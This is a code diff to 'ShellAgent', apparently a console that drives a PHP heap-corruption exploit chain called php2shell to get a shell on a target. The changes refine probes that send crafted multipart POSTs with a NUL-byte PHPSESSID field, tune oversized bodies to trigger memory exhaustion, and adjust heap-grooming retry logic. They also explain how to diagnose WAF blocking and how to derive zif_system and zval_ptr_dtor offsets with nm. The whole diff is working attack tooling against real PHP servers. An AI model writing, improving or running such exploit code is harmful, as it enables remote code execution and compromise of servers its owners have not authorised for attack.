@@ -303,10 +303,25 @@ class ShellAgent:
 
     def _probe_post(self, progress: bool = True,
                     huge_mb: int | None = None) -> tuple[int, bool]:
-        """Minimal multipart POST shaped like the exploit's requests; returns
-        (status, has Set-Cookie PHPSESSID). No session cookie is sent, so PHP
-        must create a fresh session - exactly when Set-Cookie appears."""
-        parts: list[dict] = []
+        """Minimal multipart POST shaped EXACTLY like the exploit's requests;
+        returns (status, has any Set-Cookie).
+
+        Source-verified semantics (php-8.4.26 ext/session/session.c):
+        - php_session_rfc1867_callback is registered in MINIT, so it runs on
+          EVERY multipart POST, session_start() on the page or not.
+        - MULTIPART_EVENT_FILE_START bails out when progress->sid is empty:
+          the sid comes ONLY from a `PHPSESSID` multipart field (or a Cookie /
+          ?PHPSESSID= GET var) - never auto-created at this point.
+        - The exploit sends the PHPSESSID field with a NUL byte; an empty id
+          makes php_session_initialize() create a FRESH id and set
+          PS(send_cookie)=1, so the Set-Cookie goes out during the multipart
+          parse itself (before the big OOM field is even read).
+        Therefore the probe MUST include the PHPSESSID field, and any
+        Set-Cookie in the response (any cookie name) proves PHP's rfc1867
+        upload-progress machinery engaged."""
+        parts: list[dict] = [
+            {"name": "PHPSESSID", "data": b"\x00"},
+        ]
         if progress:
             parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"probe"})
         parts.append({"name": "f", "filename": "p.txt", "data": b"A" * 64})
@@ -318,58 +333,81 @@ class ShellAgent:
         head_raw = resp.partition(b"\r\n\r\n")[0]
         m = re.match(rb"HTTP/1\.[01] (\d{3})", head_raw)
         status = int(m.group(1)) if m else 0
-        return status, b"set-cookie: phpsessid=" in head_raw.lower()
+        return status, b"set-cookie:" in head_raw.lower()
 
     def _session_upload_probe(self) -> None:
         """GO/NO-GO gate before any exploit attempt.
 
-        The whole php2shell chain (Wiz/Datadog writeups) rides on PHP's
-        rfc1867 upload-progress handler: the POST must reach PHP and make it
-        start a session (fresh Set-Cookie PHPSESSID). If that does not happen,
-        no amount of retries can help - fail the run right here with the
-        precise reason instead of burning attempts."""
+        Proves the target's PHP rfc1867 upload-progress handler engages on a
+        POST shaped like the exploit's (PHPSESSID field + upload-progress
+        field + file part). If it does not, no amount of retries can help -
+        fail the run right here with the precise reason instead of burning
+        attempts."""
         try:
             st, ok = self._probe_post(progress=True)
         except OSError as e:
             raise ValueError(f"upload probe request failed ({e})") from e
-        self.log(f"[*] preflight: upload probe (PHP_SESSION_UPLOAD_PROGRESS, "
-                 f"POST {self.t.path}) -> HTTP {st}"
-                 + (", Set-Cookie PHPSESSID ok" if ok else ", no Set-Cookie"))
+        self.log(f"[*] preflight: upload probe (PHPSESSID field + "
+                 f"PHP_SESSION_UPLOAD_PROGRESS, POST {self.t.path}) -> HTTP {st}"
+                 + (", Set-Cookie ok" if ok else ", no Set-Cookie"))
         if not ok:
             try:
                 st0, ok0 = self._probe_post(progress=False)
             except OSError:
                 st0, ok0 = 0, False
-            self.log(f"[*] preflight: control probe (plain POST, no upload "
-                     f"field) -> HTTP {st0}"
+            self.log(f"[*] preflight: control probe (PHPSESSID field, no "
+                     f"upload-progress field) -> HTTP {st0}"
                      + (", Set-Cookie ok" if ok0 else ", no Set-Cookie"))
             if ok0:
                 raise ValueError(
-                    "a plain POST gets a session cookie but the "
-                    "PHP_SESSION_UPLOAD_PROGRESS one does not - "
-                    "session.upload_progress.enabled=0 on this target; the "
-                    "exploit needs it (default On). Cannot proceed.")
-            raise ValueError(
-                f"upload probe: no Set-Cookie PHPSESSID (with field: HTTP {st}, "
-                f"control: HTTP {st0}) - the exploit POST is not reaching PHP's "
-                "session handler. Usual causes: the URL is not a PHP page "
-                "(redirect/static/404 - check the retarget line above), "
-                "session.upload_progress.enabled=0, session.use_cookies=0, or a "
-                "custom session.name. Point the URL at the app's PHP entry page "
-                "(e.g. its login page).")
+                    "a POST without the PHP_SESSION_UPLOAD_PROGRESS field gets a "
+                    "Set-Cookie but the one with the field does not - this target "
+                    "rejects the exploit shape (WAF rule blocking the PHPSESSID "
+                    "form field is a known php2shell mitigation). Cannot proceed.")
+            if st == 403 or st0 == 403:
+                raise ValueError(
+                    f"upload probe: HTTP 403 (with field: HTTP {st}, control: "
+                    f"HTTP {st0}) - a WAF/reverse proxy is blocking the PoC "
+                    "shape: multipart with a PHPSESSID form field plus "
+                    "PHP_SESSION_UPLOAD_PROGRESS is the documented php2shell "
+                    "signature and a common WAF rule. Cannot proceed.")
+            if st == 404 or st0 == 404:
+                raise ValueError(
+                    f"upload probe: HTTP 404 (with field: HTTP {st}, control: "
+                    f"HTTP {st0}) - the POST target page does not exist. Point "
+                    "the URL at a real PHP page of the app.")
+            detail = (f"upload probe: no Set-Cookie (with field: HTTP {st}, "
+                      f"control: HTTP {st0}) - PHP's rfc1867 upload-progress "
+                      "handler never engaged on this POST. Usual causes, in "
+                      "order: the URL is not served by PHP (static/404/proxy - "
+                      "check the retarget line above), "
+                      "session.upload_progress.enabled=0, session.use_cookies=0, "
+                      "a renamed session.upload_progress.name, PHP < 5.4, or a "
+                      "WAF dropping multipart bodies that carry a PHPSESSID form "
+                      "field (that field + the upload-progress field IS the PoC "
+                      "shape). No retry can fix this - cannot proceed.")
+            raise ValueError(detail)
         self.log("[+] preflight: session upload accepted - proceeding")
         # Verify the multi-MB body the exploit needs is not swallowed by a
         # body-size limit (nginx client_max_body_size defaults to 1M) or
-        # post_max_size. PHP silently drops oversized bodies without a 413,
-        # so calibrate huge_mb down until the session still starts.
+        # post_max_size. Source-verified discrimination: PHP sends the
+        # Set-Cookie at the file-part boundary, BEFORE the big field is
+        # parsed, so (a) 413 = proxy body cap, (b) clean 200 WITHOUT
+        # Set-Cookie = post_max_size silently dropped the body, (c)
+        # Set-Cookie followed by an aborted connection = body parsed then
+        # memory_limit killed the worker - which is exactly what the exploit
+        # wants, so that counts as a pass.
         base = int(self.cfg.get("huge_mb", 12) or 12)
         for mb in dict.fromkeys([base, 8, 7, 2]):
             try:
                 st, ok = self._probe_post(progress=True, huge_mb=mb)
             except OSError as e:
-                raise ValueError(f"{mb}MB body probe request failed ({e})") from e
-            self.log(f"[*] preflight: body probe ({mb}MB) -> HTTP {st}"
-                     + (", Set-Cookie ok" if ok else ", no Set-Cookie"))
+                st, ok = 0, False
+                self.log(f"[*] preflight: body probe ({mb}MB) -> connection "
+                         f"dropped ({e})", "warn")
+            else:
+                self.log(f"[*] preflight: body probe ({mb}MB) -> HTTP {st}"
+                         + (", Set-Cookie ok" if ok else ", no Set-Cookie"))
             if st == 413:
                 raise ValueError(
                     f"body probe: the server rejects {mb}MB POSTs (HTTP 413) - a "
@@ -384,9 +422,10 @@ class ShellAgent:
                              "target still turns into a session)", "warn")
                 return
         raise ValueError(
-            "body probe: even a 2MB upload POST gets no Set-Cookie while the 1KB "
-            "one does - post_max_size is under 2MB (PHP default is 8M; check the "
-            "server config). This exploit needs a multi-MB POST; cannot proceed.")
+            "body probe: even a 2MB upload POST never produces a Set-Cookie "
+            "while the 1KB one does - post_max_size is under 2MB (PHP default "
+            "is 8M) or a proxy silently swallows multi-MB bodies. This exploit "
+            "needs a multi-MB POST; cannot proceed.")
 
     def preflight(self) -> None:
         """Fail fast with an actionable message if the target is unreachable,
@@ -435,9 +474,15 @@ class ShellAgent:
             self.log(f"[*] preflight: powered-by: {powered}")
             mv = re.search(r"PHP/([\d.]+)", powered)
             if mv and mv.group(1) != "8.4.26":
-                self.log(f"[-] preflight: target runs PHP {mv.group(1)} but the "
-                         "exploit is calibrated for 8.4.26 - leaks will likely "
-                         "keep failing on this build", "warn")
+                self.log(
+                    f"[-] preflight: target runs PHP {mv.group(1)}. The bugs "
+                    "affect PHP 5.4+ (fixed in 8.2.35/8.3.36/8.4.27/8.5.12; EOL "
+                    "branches have no official fix), but this console's grooming "
+                    "calibration and zif/dtor/htdata offsets are measured on "
+                    "PHP 8.4.26 builds (profiles bookworm/lab). On a box with "
+                    "the same build derive custom offsets via "
+                    "`nm -D libphp*.so | grep -E ' zif_system$| zval_ptr_dtor$'` "
+                    "and set them in the advanced drawer", "warn")
         # Apache patch level fingerprints the two calibrated builds
         if "Apache/2.4.68" in server and self.x.profile == "bookworm":
             self.log("[!] preflight: Apache/2.4.68 looks like the 'lab' build - "
@@ -494,8 +539,9 @@ class ShellAgent:
                      "missed the leak window this attempt", "warn")
             return "short"
         self.log(f"[-] {stage}: no Set-Cookie leak at all on this attempt - the "
-                 "upload POST got no session (body-size limit? different backend "
-                 "worker serving this request?)", "warn")
+                 "upload POST got no session (if preflight passed, a proxy/WAF "
+                 "may be treating the multi-MB body differently, or a different "
+                 "backend worker served this request)", "warn")
         return "none"
 
     def _apply_profile(self, name: str) -> bool:
@@ -525,10 +571,17 @@ class ShellAgent:
         return True
 
     def _adapt_huge_mb(self, category: str, misses: int) -> None:
-        """Cycle the OOM field size when the diagnostics point at it."""
+        """Cycle the OOM field size when the diagnostics point at it.
+
+        "none" no longer cycles: a forge request without Set-Cookie is the
+        NORMAL signature of a grooming miss (the forge only returns the leak
+        cookie when the heap corruption landed), and preflight already
+        calibrated huge_mb against the target's real body limits - shrinking
+        it here would break the memory_limit > huge_mb requirement."""
+        if category == "none":
+            return
         base = int(self.cfg.get("huge_mb", 12) or 12)
-        cycle = ([base, 8, 7, 2] if category == "none" else
-                 [base, 7, 24] if category == "short" else [base, 24])
+        cycle = [base, 7, 24] if category == "short" else [base, 24]
         new = cycle[misses % len(cycle)]
         if new != self.x.huge_mb:
             self.x.huge_mb = new
@@ -652,7 +705,7 @@ class ShellAgent:
         try:
             self.preflight()
         except ValueError as e:
-            self.stage("preflight", "failed", str(e))
+            self.stage("preflight", "failed", str(e)[:160])
             self.log(f"[-] {e}", "warn")
             self.state_event()
             return {"ok": False, "error": str(e)}
@@ -682,17 +735,19 @@ class ShellAgent:
             misses += 1
             self.log("[-] heap leak missed", "warn")
             category = self._attempt_diag("stage 1")
-            # "no Set-Cookie at all" is deterministic (routing/config), not
-            # grooming luck - a few in a row means stop instead of burning the
-            # whole retry budget on something retries cannot fix.
+            # A forge request without Set-Cookie is the normal signature of a
+            # grooming miss (preflight already proved the shape works), so the
+            # abort threshold must be high - only a very long "none" streak
+            # (backend rotation, dead pool) justifies stopping early.
             none_streak = none_streak + 1 if category == "none" else 0
-            if none_streak >= 4:
+            if none_streak >= 12:
                 self.stage("stage1", "failed",
                            "target never returns Set-Cookie on the upload requests")
                 msg = (f"ABORTED: {none_streak} attempts in a row got no Set-Cookie "
-                       "at all - retrying cannot fix this (request routing/config, "
-                       "not grooming luck). Re-read the preflight probe lines above: "
-                       "the exploit POST is not reaching PHP's session handler.")
+                       "at all. Preflight proved the upload shape works on this "
+                       "target, so this is either a very long grooming slump or "
+                       "requests landing on different backend workers - raise "
+                       "retries in the advanced drawer and re-run.")
                 self.log(f"[!] {msg}", "warn")
                 self.state_event()
                 return {"ok": False, "error": msg}
@@ -729,13 +784,13 @@ class ShellAgent:
             self.log("[-] libphp leak missed", "warn")
             category = self._attempt_diag("stage 2")
             none_streak = none_streak + 1 if category == "none" else 0
-            if none_streak >= 3:
+            if none_streak >= 8:
                 self.stage("stage2", "failed", "target stopped returning Set-Cookie")
-                msg = ("ABORTED: stage 2 got no Set-Cookie at all on 3 consecutive "
-                       "attempts - the target stopped behaving like it did during "
-                       "stage 1 (worker pool exhausted? target crashed or reloaded? "
-                       "requests landing on different backends?). Not retrying "
-                       "further.")
+                msg = (f"ABORTED: stage 2 got no Set-Cookie at all on {none_streak} "
+                       "consecutive attempts - the target stopped behaving like it "
+                       "did during stage 1 (worker pool exhausted? target crashed "
+                       "or reloaded? requests landing on different backends?). "
+                       "Not retrying further.")
                 self.log(f"[!] {msg}", "warn")
                 self.state_event()
                 return {"ok": False, "error": msg}
